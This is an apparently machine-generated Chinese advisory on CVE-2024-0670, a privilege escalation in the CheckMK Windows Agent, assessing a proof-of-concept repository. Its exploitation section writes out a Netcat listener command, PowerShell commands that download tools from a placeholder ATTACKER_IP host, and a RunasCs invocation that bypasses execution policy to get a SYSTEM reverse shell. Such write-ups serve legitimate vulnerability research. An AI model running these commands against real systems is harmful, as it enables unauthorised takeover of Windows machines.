## CVE-2024-0670 - CheckMK Windows Agent 本地权限提升 (LPE)

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升 (LPE)

**影响应用:** CheckMK Windows Agent

**危害等级:** 高危：允许低权限用户获得SYSTEM权限，导致完全系统控制。

**CVSS评分:** N/A

**影响版本:** 未明确指定，但影响已安装CheckMK Windows Agent的系统。

**利用条件:** 需要低权限Windows用户、Powershell启用、已安装CheckMK Windows Agent、能够下载文件到目标系统、攻击者需搭建HTTP服务器和Netcat监听器。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2024-0670描述了CheckMK Windows Agent中的一个本地权限提升（LPE）漏洞。此缺陷由SEC Consult披露，允许低权限的本地用户将权限提升至NT AUTHORITY\SYSTEM。该漏洞的根源在于CheckMK代理在执行MSI修复操作期间会执行位于C:\Windows\Temp\目录中的文件。拥有标准用户权限的攻击者可以在此临时目录中放置具有可预测名称的恶意可执行文件或脚本。当MSI修复被触发时，这些预先放置的文件将以SYSTEM权限执行，从而使攻击者能够完全控制受损系统。

**POC有效性分析：**
所提供的概念验证（POC）演示了利用CVE-2024-0670的一种清晰有效的方法。该存储库通过`README.md`文件进行了良好文档化，详细说明了漏洞、其摘要以及明确的利用步骤。关键组件包括：
1.  **`RunasCs.exe`**：一个自定义的`runas`替代工具，由提供的`RunasCs.cs`源代码编译而来，旨在以指定的用户凭据执行命令。`RunasCs.cs`源代码的可用性增强了透明度，并允许独立验证其非恶意功能。
2.  **`nc.exe`**：一个标准的Netcat可执行文件，用于建立反向shell。
3.  **`exploit.ps1`**：一个PowerShell脚本（其完整内容未提供，但功能已描述），负责协调利用过程。该脚本将有效载荷（例如，配置为反向shell的`nc.exe`）放置到`C:\Windows\Temp\`中，并使用MSI修复预期文件名，然后触发修复以实现SYSTEM权限执行。
所概述的步骤逻辑清晰且实用，指导攻击者设置HTTP服务器、Netcat监听器、部署工具，并最终执行漏洞利用。成功获得SYSTEM反向shell的结果验证了POC通过利用常见Windows功能和标准工具实现完整权限提升的有效性。

**利用步骤：**
为了利用CVE-2024-0670，攻击者通常会遵循以下步骤：
1.  **攻击者设置**：在攻击者的机器上配置一个简单的HTTP服务器（例如，使用Python的`http.server`模块）来托管`RunasCs.exe`、`nc.exe`和`exploit.ps1`。启动一个Netcat监听器（例如，`nc -lvnp 1111`）以等待反向shell连接。
2.  **目标交互（低权限用户）**：在运行CheckMK Agent的受害者Windows机器上的低权限会话中，使用PowerShell将漏洞利用工具下载到`C:\Windows\Temp\`目录：
    ```powershell
    Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"
    Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"
    Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/exploit.ps1" -OutFile "C:\Windows\Temp\exploit.ps1"
    ```
3.  **执行漏洞利用脚本**：通过`RunasCs.exe`执行`exploit.ps1`，并提供低权限用户的凭据。此操作将启动MSI修复，导致植入的可执行文件以SYSTEM权限运行。
    ```powershell
    .\RunasCs.exe username "password" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"
    ```
4.  **获得SYSTEM Shell**：成功利用后，一个具有SYSTEM权限的反向shell将连接回攻击者的Netcat监听器。

**投毒风险分析：**
对于使用此CVE-2024-0670 POC存储库进行防御性安全研究的研究人员而言，投毒风险较低（估计为10%）。此评估主要基于存储库的透明度和设计。

首先，`README.md`文件公开详细描述了漏洞、利用方法和文件用途，并通过法律免责声明强调了其“教育和授权渗透测试”的目的。这种透明度对于区分良性安全工具和恶意工具至关重要。

至关重要的是，`RunasCs.cs`以完整的C#源代码形式提供。这允许研究人员独立审计代码，验证其作为`runas`替代工具的预期功能，确保没有隐藏后门或有害代码。从这个受信任的源代码编译`RunasCs.exe`，显著降低了执行预编译的、可能被篡改的二进制文件的风险。

POC的操作模型要求研究人员在自己的攻击者控制的HTTP服务器（`ATTACKER_IP`）上托管`exploit.ps1`和`nc.exe`。这种设计意味着*存储库本身*不直接分发旨在感染研究人员系统的预打包恶意有效载荷。漏洞利用中的“恶意”组件是研究人员选择从自己的环境中部署的那些。勤勉的研究人员会彻底审查任何`exploit.ps1`脚本（即使是单独获取的），并从受信任的渠道获取`nc.exe`或自行编译。虽然输入中未提供`exploit.ps1`和`nc.exe`的完整内容，但存储库描述了它们的标准漏洞利用角色。

提供的`RunasCs.cs`片段中没有代码混淆，也没有指示直接从不受信任的第三方URL执行任何未知外部脚本。像Python（用于HTTP服务）和Netcat这样的依赖项都是标准工具，预期由研究人员独立获取和验证。因此，源自*此特定POC存储库内容*的直接投毒风险被认为是最小的。

**项目地址:** 未在输入数据中明确提供POC项目地址

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-0670
